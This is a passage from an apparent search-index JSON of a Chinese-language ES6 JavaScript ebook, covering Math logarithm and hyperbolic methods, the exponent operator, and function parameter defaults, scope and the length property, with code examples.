x)</code>\u3002\u5982\u679c<code>x</code>\u5c0f\u4e8e-1\uff0c\u8fd4\u56de<code>NaN</code>\u3002</p> <pre><code>Math.log1p(1)  // 0.6931471805599453\nMath.log1p(0)  // 0\nMath.log1p(-1) // -Infinity\nMath.log1p(-2) // NaN\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.log1p = Math.log1p || function(x) {\n  return Math.log(1 + x);\n};\n</code></pre> <p>Math.log10()</p> <p><code>Math.log10(x)</code>\u8fd4\u56de\u4ee5 10 \u4e3a\u5e95\u7684<code>x</code>\u7684\u5bf9\u6570\u3002\u5982\u679c<code>x</code>\u5c0f\u4e8e 0\uff0c\u5219\u8fd4\u56de NaN\u3002</p> <pre><code>Math.log10(2)      // 0.3010299956639812\nMath.log10(1)      // 0\nMath.log10(0)      // -Infinity\nMath.log10(-2)     // NaN\nMath.log10(100000) // 5\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.log10 = Math.log10 || function(x) {\n  return Math.log(x) / Math.LN10;\n};\n</code></pre> <p>Math.log2()</p> <p><code>Math.log2(x)</code>\u8fd4\u56de\u4ee5 2 \u4e3a\u5e95\u7684<code>x</code>\u7684\u5bf9\u6570\u3002\u5982\u679c<code>x</code>\u5c0f\u4e8e 0\uff0c\u5219\u8fd4\u56de NaN\u3002</p> <pre><code>Math.log2(3)       // 1.584962500721156\nMath.log2(2)       // 1\nMath.log2(1)       // 0\nMath.log2(0)       // -Infinity\nMath.log2(-2)      // NaN\nMath.log2(1024)    // 10\nMath.log2(1 &lt;&lt; 29) // 29\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.log2 = Math.log2 || function(x) {\n  return Math.log(x) / Math.LN2;\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#6","title":"6\u4e2a\u53cc\u66f2\u51fd\u6570\u65b9\u6cd5","text":"<p>ES6 \u65b0\u589e\u4e86 6 \u4e2a\u53cc\u66f2\u51fd\u6570\u65b9\u6cd5\u3002</p> <ul> <li><code>Math.sinh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cc\u66f2\u6b63\u5f26\uff08hyperbolic sine\uff09</li> <li><code>Math.cosh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cc\u66f2\u4f59\u5f26\uff08hyperbolic cosine\uff09</li> <li><code>Math.tanh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cc\u66f2\u6b63\u5207\uff08hyperbolic tangent\uff09</li> <li><code>Math.asinh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cd\u53cc\u66f2\u6b63\u5f26\uff08inverse hyperbolic sine\uff09</li> <li><code>Math.acosh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cd\u53cc\u66f2\u4f59\u5f26\uff08inverse hyperbolic cosine\uff09</li> <li><code>Math.atanh(x)</code> \u8fd4\u56de<code>x</code>\u7684\u53cd\u53cc\u66f2\u6b63\u5207\uff08inverse hyperbolic tangent\uff09</li> </ul>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#_4","title":"\u6307\u6570\u8fd0\u7b97\u7b26","text":"<p>ES2016 \u65b0\u589e\u4e86\u4e00\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\uff08<code>**</code>\uff09\u3002</p> <pre><code>2 ** 2 // 4\n2 ** 3 // 8\n</code></pre> <p>\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u7279\u70b9\u662f\u53f3\u7ed3\u5408\uff0c\u800c\u4e0d\u662f\u5e38\u89c1\u7684\u5de6\u7ed3\u5408\u3002\u591a\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\u8fde\u7528\u65f6\uff0c\u662f\u4ece\u6700\u53f3\u8fb9\u5f00\u59cb\u8ba1\u7b97\u7684\u3002</p> <pre><code>// \u76f8\u5f53\u4e8e 2 ** (3 ** 2)\n2 ** 3 ** 2\n// 512\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9996\u5148\u8ba1\u7b97\u7684\u662f\u7b2c\u4e8c\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u662f\u7b2c\u4e00\u4e2a\u3002</p> <p>\u6307\u6570\u8fd0\u7b97\u7b26\u53ef\u4ee5\u4e0e\u7b49\u53f7\u7ed3\u5408\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u8d4b\u503c\u8fd0\u7b97\u7b26\uff08<code>**=</code>\uff09\u3002</p> <pre><code>let a = 1.5;\na **= 2;\n// \u7b49\u540c\u4e8e a = a * a;\n\nlet b = 4;\nb **= 3;\n// \u7b49\u540c\u4e8e b = b * b * b;\n</code></pre> <p>\u6ce8\u610f\uff0cV8 \u5f15\u64ce\u7684\u6307\u6570\u8fd0\u7b97\u7b26\u4e0e<code>Math.pow</code>\u7684\u5b9e\u73b0\u4e0d\u76f8\u540c\uff0c\u5bf9\u4e8e\u7279\u522b\u5927\u7684\u8fd0\u7b97\u7ed3\u679c\uff0c\u4e24\u8005\u4f1a\u6709\u7ec6\u5fae\u7684\u5dee\u5f02\u3002</p> <pre><code>Math.pow(99, 99)\n// 3.697296376497263e+197\n\n99 ** 99\n// 3.697296376497268e+197\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a\u8fd0\u7b97\u7ed3\u679c\u7684\u6700\u540e\u4e00\u4f4d\u6709\u6548\u6570\u5b57\u662f\u6709\u5dee\u5f02\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/","title":"\u51fd\u6570\u7684\u6269\u5c55","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 36194  \u9605\u8bfb73\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_2","title":"\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c","text":""},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_3","title":"\u57fa\u672c\u7528\u6cd5","text":"<p>ES5 \u4e0d\u80fd\u76f4\u63a5\u4e3a\u51fd\u6570\u7684\u53c2\u6570\u6307\u5b9a\u9ed8\u8ba4\u503c\u3002\u51fd\u6570\u5728\u4f7f\u7528\u524d\uff0c\u4f1a\u5224\u65ad\u53c2\u6570\u662f\u5426\u6709\u6548\uff0c\u5982\u679c\u65e0\u6548\u8bbe\u7f6e\u9ed8\u8ba4\u503c\uff08\u95ee\u9898\u662f\uff0c\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662ffalse\u7b49\u4e94\u4e2a\u53c2\u6570\uff0c\u51fd\u6570\u4f1a\u51fa\u9519\uff09\u3002\u53ef\u4ee5\u5148\u5224\u65ad\u4e00\u4e0b\u53c2\u6570<code>y</code>\u662f\u5426\u88ab\u8d4b\u503c\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u518d\u7b49\u4e8e\u9ed8\u8ba4\u503c\u3002</p> <pre><code>function log(x, y) {\n  // y = y || 'World'; \u8fd9\u4e2a\u4e0d\u80fd\u5904\u7406\u4e94\u4e2a\u7279\u6b8a\u60c5\u51b5\n  if (typeof y === 'undefined') {\n    y = 'World';\n  }\n}\n</code></pre> <p>ES6 \u5141\u8bb8\u4e3a\u51fd\u6570\u7684\u53c2\u6570\u8bbe\u7f6e\u9ed8\u8ba4\u503c\uff0c\u5373\u76f4\u63a5\u5199\u5728\u53c2\u6570\u5b9a\u4e49\u7684\u540e\u9762\u3002ES6 \u7684\u5199\u6cd5\u6bd4 ES5 \u7b80\u6d01\u8bb8\u591a\uff0c\u800c\u4e14\u975e\u5e38\u81ea\u7136\u3002</p> <pre><code>function log(x, y = 'World') {\n  console.log(x, y);\n}\n\nfunction Point(x = 0, y = 0) {\n  this.x = x;\n  this.y = y;\n}\nconst p = new Point();\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_4","title":"\u89e3\u6784\u8d4b\u503c\u9ed8\u8ba4\u503c","text":"<p>\u53c2\u6570\u9ed8\u8ba4\u503c\u53ef\u4ee5\u4e0e\u89e3\u6784\u8d4b\u503c\u7684\u9ed8\u8ba4\u503c\uff0c\u7ed3\u5408\u8d77\u6765\u4f7f\u7528\u3002</p> <pre><code>function foo({x, y = 5}) {\n  console.log(x, y);\n}\n\nfoo({}) // undefined 5\nfoo({x: 1}) // 1 5\nfoo({x: 1, y: 2}) // 1 2\nfoo() // TypeError: Cannot read property 'x' of undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u53ea\u4f7f\u7528\u4e86\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\u9ed8\u8ba4\u503c\uff0c\u6ca1\u6709\u4f7f\u7528\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3002\u53ea\u6709\u5f53\u51fd\u6570<code>foo</code>\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u53d8\u91cf<code>x</code>\u548c<code>y</code>\u624d\u4f1a\u901a\u8fc7\u89e3\u6784\u8d4b\u503c\u751f\u6210\u3002\u5982\u679c\u51fd\u6570<code>foo</code>\u8c03\u7528\u65f6\u6ca1\u63d0\u4f9b\u53c2\u6570\uff0c\u53d8\u91cf<code>x</code>\u548c<code>y</code>\u5c31\u4e0d\u4f1a\u751f\u6210\uff0c\u4ece\u800c\u62a5\u9519\u3002\u901a\u8fc7\u63d0\u4f9b\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u3002</p> <pre><code>function fetch(url, { body = '', method = 'GET', headers = {} }) {\n  console.log(method);\n}\n\nfetch('http://example.com', {})\n// \"GET\"\n\nfetch('http://example.com')\n// \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u51fd\u6570<code>fetch</code>\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u4e3a\u5b83\u7684\u4e09\u4e2a\u5c5e\u6027\u8bbe\u7f6e\u9ed8\u8ba4\u503c\u3002\u8fd9\u79cd\u5199\u6cd5\u4e0d\u80fd\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u7ed3\u5408\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\uff0c\u5c31\u53ef\u4ee5\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u8fd9\u65f6\uff0c\u5c31\u51fa\u73b0\u4e86\u53cc\u91cd\u9ed8\u8ba4\u503c\u3002</p> <pre><code>function fetch(url, { body = '', method = 'GET', headers = {} } = {}) {\n  console.log(method);\n}\n\nfetch('http://example.com')\n// \"GET\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>fetch</code>\u6ca1\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\u65f6\uff0c\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u5c31\u4f1a\u751f\u6548\uff0c\u7136\u540e\u624d\u662f\u89e3\u6784\u8d4b\u503c\u7684\u9ed8\u8ba4\u503c\u751f\u6548\uff0c\u53d8\u91cf<code>method</code>\u624d\u4f1a\u53d6\u5230\u9ed8\u8ba4\u503c<code>GET</code>\u3002</p> <p>\u8bf7\u95ee\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u6709\u4ec0\u4e48\u5dee\u522b\uff1f</p> <pre><code>// \u5199\u6cd5\u4e00\nfunction m1({x = 0, y = 0} = {}) {\n  return [x, y];\n}\n\n// \u5199\u6cd5\u4e8c\nfunction m2({x, y} = { x: 0, y: 0 }) {\n  return [x, y];\n}\n</code></pre> <p>\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u5bf9\u51fd\u6570\u7684\u53c2\u6570\u8bbe\u5b9a\u4e86\u9ed8\u8ba4\u503c\uff0c\u533a\u522b\u662f\u5199\u6cd5\u4e00\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u662f\u7a7a\u5bf9\u8c61\uff0c\u4f46\u662f\u8bbe\u7f6e\u4e86\u5bf9\u8c61\u89e3\u6784\u8d4b\u503c\u7684\u9ed8\u8ba4\u503c\uff1b\u5199\u6cd5\u4e8c\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u6709\u5177\u4f53\u5c5e\u6027\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u6ca1\u6709\u8bbe\u7f6e\u5bf9\u8c61\u89e3\u6784\u8d4b\u503c\u7684\u9ed8\u8ba4\u503c\u3002</p> <pre><code>// \u51fd\u6570\u6ca1\u6709\u53c2\u6570\u7684\u60c5\u51b5\nm1() // [0, 0]\nm2() // [0, 0]\n\n// x \u548c y \u90fd\u6709\u503c\u7684\u60c5\u51b5\nm1({x: 3, y: 8}) // [3, 8]\nm2({x: 3, y: 8}) // [3, 8]\n\n// x \u6709\u503c\uff0cy \u65e0\u503c\u7684\u60c5\u51b5\nm1({x: 3}) // [3, 0]\nm2({x: 3}) // [3, undefined]\n\n// x \u548c y \u90fd\u65e0\u503c\u7684\u60c5\u51b5\nm1({}) // [0, 0];\nm2({}) // [undefined, undefined]\n\nm1({z: 3}) // [0, 0]\nm2({z: 3}) // [undefined, undefined]\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_5","title":"\u53c2\u6570\u9ed8\u8ba4\u503c\u7684\u4f4d\u7f6e","text":"<p>\u5b9a\u4e49\u4e86\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\uff0c\u5e94\u8be5\u662f\u51fd\u6570\u7684\u5c3e\u53c2\u6570\u3002\u56e0\u4e3a\u8fd9\u6837\u6bd4\u8f83\u5bb9\u6613\u770b\u51fa\u6765\uff0c\u5230\u5e95\u7701\u7565\u4e86\u54ea\u4e9b\u53c2\u6570\u3002\u5982\u679c\u975e\u5c3e\u90e8\u7684\u53c2\u6570\u8bbe\u7f6e\u9ed8\u8ba4\u503c\uff0c\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u53c2\u6570\u662f\u6ca1\u6cd5\u7701\u7565\u7684\u3002</p> <pre><code>// \u4f8b\u4e00\nfunction f(x = 1, y) {\n  return [x, y];\n}\n\nf() // [1, undefined]\nf(2) // [2, undefined])\nf(, 1) // \u62a5\u9519\nf(undefined, 1) // [1, 1]\n\n// \u4f8b\u4e8c\nfunction f(x, y = 5, z) {\n  return [x, y, z];\n}\n\nf() // [undefined, 5, undefined]\nf(1) // [1, 5, undefined]\nf(1, ,2) // \u62a5\u9519\nf(1, undefined, 2) // [1, 5, 2]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u90fd\u4e0d\u662f\u5c3e\u53c2\u6570\u3002\u8fd9\u65f6\uff0c\u65e0\u6cd5\u53ea\u7701\u7565\u8be5\u53c2\u6570\uff0c\u800c\u4e0d\u7701\u7565\u5b83\u540e\u9762\u7684\u53c2\u6570\uff0c\u9664\u975e\u663e\u5f0f\u8f93\u5165<code>undefined</code>\u3002\u5982\u679c\u4f20\u5165<code>undefined</code>\uff0c\u5c06\u89e6\u53d1\u8be5\u53c2\u6570\u7b49\u4e8e\u9ed8\u8ba4\u503c\uff0c<code>null</code>\u5219\u6ca1\u6709\u8fd9\u4e2a\u6548\u679c\u3002</p> <pre><code>function foo(x = 5, y = 6) {\n  console.log(x, y);\n}\nfoo(undefined, null)\n// 5 null\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#length","title":"\u51fd\u6570 length \u5c5e\u6027","text":"<p>\u6307\u5b9a\u4e86\u9ed8\u8ba4\u503c\u4ee5\u540e\uff0c\u51fd\u6570\u7684<code>length</code>\u5c5e\u6027\uff0c\u5c06\u8fd4\u56de\u6ca1\u6709\u6307\u5b9a\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u4e2a\u6570\u3002\u6307\u5b9a\u4e86\u9ed8\u8ba4\u503c\u540e\uff0c<code>length</code>\u5c5e\u6027\u5c06\u5931\u771f\u3002</p> <pre><code>(function (a) {}).length // 1\n(function (a = 5) {}).length // 0\n(function (a, b, c = 5) {}).length // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>length</code>\u5c5e\u6027\u7684\u8fd4\u56de\u503c\uff0c\u7b49\u4e8e\u51fd\u6570\u7684\u53c2\u6570\u4e2a\u6570\u51cf\u53bb\u6307\u5b9a\u4e86\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u4e2a\u6570\u3002\u8fd9\u662f\u56e0\u4e3a<code>length</code>\u5c5e\u6027\u7684\u542b\u4e49\u662f\uff0c\u8be5\u51fd\u6570\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u3002\u67d0\u4e2a\u53c2\u6570\u6307\u5b9a\u9ed8\u8ba4\u503c\u4ee5\u540e\uff0c\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u5c31\u4e0d\u5305\u62ec\u8fd9\u4e2a\u53c2\u6570\u4e86\u3002\u540c\u7406\uff0c\u540e\u6587\u7684 rest \u53c2\u6570\u4e5f\u4e0d\u4f1a\u8ba1\u5165<code>length</code>\u5c5e\u6027\u3002</p> <pre><code>(function(...args) {}).length // 0\n</code></pre> <p>\u5982\u679c\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u4e0d\u662f\u5c3e\u53c2\u6570\uff0c\u90a3\u4e48<code>length</code>\u5c5e\u6027\u4e5f\u4e0d\u518d\u8ba1\u5165\u540e\u9762\u7684\u53c2\u6570\u4e86\u3002</p> <pre><code>(function (a = 0, b, c) {}).length // 0\n(function (a, b = 1, c) {}).length // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_6","title":"\u4f5c\u7528\u57df","text":"<p>\u4e00\u65e6\u8bbe\u7f6e\u4e86\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\uff0c\u51fd\u6570\u8fdb\u884c\u58f0\u660e\u521d\u59cb\u5316\u65f6\uff0c\u53c2\u6570\u4f1a\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff08context\uff09\u3002\u7b49\u5230\u521d\u59cb\u5316\u7ed3\u675f\uff0c\u8fd9\u4e2a\u4f5c\u7528\u57df\u5c31\u4f1a\u6d88\u5931\u3002\u8fd9\u79cd\u8bed\u6cd5\u884c\u4e3a\uff0c\u5728\u4e0d\u8bbe\u7f6e\u53c2\u6570\u9ed8\u8ba4\u503c\u65f6\uff0c\u662f\u4e0d\u4f1a\u51fa\u73b0\u7684\u3002</p> <pre><code>var x = 1;\n\nfunction f(x, y = x) {\n  console.log(y);\n}\n\nf(2) // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53c2\u6570<code>y</code>\u7684\u9ed8\u8ba4\u503c\u7b49\u4e8e\u53d8\u91cf<code>x</code>\u3002\u8c03\u7528\u51fd\u6570<code>f</code>\u65f6\uff0c\u53c2\u6570\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\u3002\u5728\u8fd9\u4e2a\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u9ed8\u8ba4\u503c\u53d8\u91cf<code>x</code>\u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570<code>x</code>\uff0c\u800c\u4e0d\u662f\u5168\u5c40\u53d8\u91cf<code>x</code>\uff0c\u6240\u4ee5\u8f93\u51fa\u662f<code>2</code>\u3002</p> <p>\u518d\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>let x = 1;\n\nfunction f(y = x) {\n  let x = 2;\n  console.log(y);\n}\n\nf() // 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>f</code>\u8c03\u7528\u65f6\uff0c\u53c2\u6570<code>y = x</code>\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\u3002\u8fd9\u4e2a\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u53d8\u91cf<code>x</code>\u672c\u8eab\u6ca1\u6709\u5b9a\u4e49\uff0c\u6240\u4ee5\u6307\u5411\u5916\u5c42\u7684\u5168\u5c40\u53d8\u91cf<code>x</code>\u3002\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u51fd\u6570\u4f53\u5185\u90e8\u7684\u5c40\u90e8\u53d8\u91cf<code>x</code>\u5f71\u54cd\u4e0d\u5230\u9ed8\u8ba4\u503c\u53d8\u91cf<code>x</code>\u3002</p> <p>\u5982\u679c\u6b64\u65f6\uff0c\u5168\u5c40\u53d8\u91cf<code>x</code>\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>function f(y = x) {\n  let x = 2;\n  console.log(y);\n}\nf() // ReferenceError: x is not defined\n</code></pre> <p>\u4e0b\u9762\u8fd9\u6837\u5199\uff0c\u4e5f\u4f1a\u62a5\u9519\u3002</p> <pre><code>var x = 1;\nfunction foo(x = x) {\n  // ...\n}\nfoo() // ReferenceError: x is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53c2\u6570<code>x = x</code>\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u4f5c\u7528\u57df\u3002\u5b9e\u9645\u6267\u884c\u7684\u662f<code>let x = x</code>\uff0c\u7531\u4e8e\u6682\u65f6\u6027\u6b7b\u533a\u7684\u539f\u56e0\uff0c\u8fd9\u884c\u4ee3\u7801\u4f1a\u62a5\u9519\u201dx \u672a\u5b9a\u4e49\u201c\u3002</p> <p>\u5982\u679c\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7684\u4f5c\u7528\u57df\u4e5f\u9075\u5b88\u8fd9\u4e2a\u89c4\u5219\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>let foo = 'outer';\n\nfunction bar(func = () =&gt; foo) {\n  let foo = 'inner';\n  console.log(func());\n}\n\nbar(); // outer\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>bar</code>\u7684\u53c2\u6570<code>func</code>\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u8fd4\u56de\u503c\u4e3a\u53d8\u91cf<code>foo</code>\u3002\u51fd\u6570\u53c2\u6570\u5f62\u6210\u7684\u5355\u72ec\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u5e76\u6ca1\u6709\u5b9a\u4e49\u53d8\u91cf<code>foo</code>\uff0c\u6240\u4ee5<code>foo</code>\u6307\u5411\u5916\u5c42\u7684\u5168\u5c40\u53d8\u91cf<code>foo</code>\uff0c\u56e0\u6b64\u8f93\u51fa<code>outer</code>\u3002</p> <p>\u5982\u679c\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>function bar(func = () =&gt; foo) {\n  let foo = 'inner';\n  console.log(func());\n}\n\nbar() // ReferenceError: foo is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u533f\u540d\u51fd\u6570\u91cc\u9762\u7684<code>foo</code>\u6307\u5411\u51fd\u6570\u5916\u5c42\uff0c\u4f46\u662f\u51fd\u6570\u5916\u5c42\u5e76\u6ca1\u6709\u58f0\u660e\u53d8\u91cf<code>foo</code>\uff0c\u6240\u4ee5\u5c31\u62a5\u9519\u4e86\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\u3002</p> <pre><code>var x = 1;\nfunction foo(x, y = function() { x = 2; }) {\n  var x = 3;\n  y();\n  console.log(x);\n}\n\nfoo() // 3\nx // 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>foo</code>\u7684\u53c2\u6570\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u4f5c\u7528\u57df\u3002\u8fd9\u4e2a\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u9996\u5148\u58f0\u660e\u4e86\u53d8\u91cf<code>x</code>\uff0c\u7136\u540e\u58f0\u660e\u4e86\u53d8\u91cf<code>y</code>\uff0c<code>y</code>\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u3002\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf<code>x</code>\uff0c\u6307\u5411\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570<code>x</code>\u3002\u51fd\u6570<code>foo</code>\u5185\u90e8\u53c8\u58f0\u660e\u4e86\u4e00\u4e2a\u5185\u90e8\u53d8\u91cf<code>x</code>\uff0c\u8be5\u53d8\u91cf\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570<code>x</code>\u7531\u4e8e\u4e0d\u662f\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\uff0c\u6240\u4ee5\u4e0d\u662f\u540c\u4e00\u4e2a\u53d8\u91cf\uff0c\u56e0\u6b64\u6267\u884c<code>y</code>\u540e\uff0c\u5185\u90e8\u53d8\u91cf<code>x</code>\u548c\u5916\u90e8\u5168\u5c40\u53d8\u91cf<code>x</code>\u7684\u503c\u90fd\u6ca1\u53d8\u3002</p> <p>\u5982\u679c\u5c06<code>var x = 3</code>\u7684<code>var</code>\u53bb\u9664\uff0c\u51fd\u6570<code>foo</code>\u7684\u5185\u90e8\u53d8\u91cf<code>x</code>\u5c31\u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570<code>x</code>\uff0c\u4e0e\u533f\u540d\u51fd\u6570\u5185\u90e8\u7684<code>x</code>\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6700\u540e\u8f93\u51fa\u7684\u5c31\u662f<code>2</code>\uff0c\u800c\u5916\u5c42\u7684\u5168\u5c40\u53d8\u91cf<code>x</code>\u4f9d\u7136\u4e0d\u53d7\u5f71\u54cd\u3002</p> <pre><code>var x = 1;\nfunction foo(x, y = function() { x = 2; }) {\n  x = 3;\n  y();\n  console.log(x);\n}\n\nfoo() // 2\nx // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_7","title":"\u5e94\u7528","text":"<p>\u5229\u7528\u53c2\u6570\u9ed8\u8ba4\u503c\uff0c\u53ef\u4ee5\u6307\u5b9a\u67d0\u4e00\u4e2a\u53c2\u6570\u4e0d\u5f97\u7701\u7565\uff0c\u5982\u679c\u7701\u7565\u5c31\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> <pre><code>function throwIfMissing() {\n  throw new Error('Missing parameter');\n}\n\nfunction foo(mustBeProvided = throwIfMissing()) {\n  return mustBeProvided;\n}\n\nfoo()\n// Error: Missing parameter\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>foo</code>\u51fd\u6570\uff0c\u5982\u679c\u8c03\u7528\u7684\u65f6\u5019\u6ca1\u6709\u53c2\u6570\uff0c\u5c31\u4f1a\u8c03\u7528\u9ed8\u8ba4\u503c<code>throwIfMissing</code>\u51fd\u6570\uff0c\u4ece\u800c\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> 